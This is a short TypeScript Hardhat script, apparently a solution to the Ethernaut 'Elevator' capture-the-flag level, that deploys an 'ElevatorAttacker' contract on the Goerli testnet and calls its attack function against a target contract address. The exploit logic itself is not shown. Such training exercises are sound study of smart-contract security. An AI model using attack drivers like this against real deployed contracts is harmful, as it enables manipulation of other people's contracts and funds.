import { TransactionResponse } from "@ethersproject/providers"
import { ethers } from "hardhat";
import * as dotenv from "dotenv";

dotenv.config();

const provider = new ethers.providers.JsonRpcProvider(process.env.GOERLI_URL)
const privateKey: string = process.env.PRIVATE_KEY || ""
const attacker = new ethers.Wallet(privateKey, provider)

const CONTRACT_NAME = "Elevator"
const CONTRACT_ADDRESS = "0x67f194DFde46A4161b00445584DC33e141d336a6"
const CONTRACT_NAME_ATTACKER = "ElevatorAttacker"

async function main() {
    const ElevatorAttacker = await ethers.getContractFactory(CONTRACT_NAME_ATTACKER)
    const attackerContract = await ElevatorAttacker.connect(attacker).deploy()
    await attackerContract.deployed()

    const tx: TransactionResponse = await attackerContract.connect(attacker).attack(CONTRACT_ADDRESS)
    await tx.wait()

    console.log("Elevator: reached the top of the building");
}

main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
  });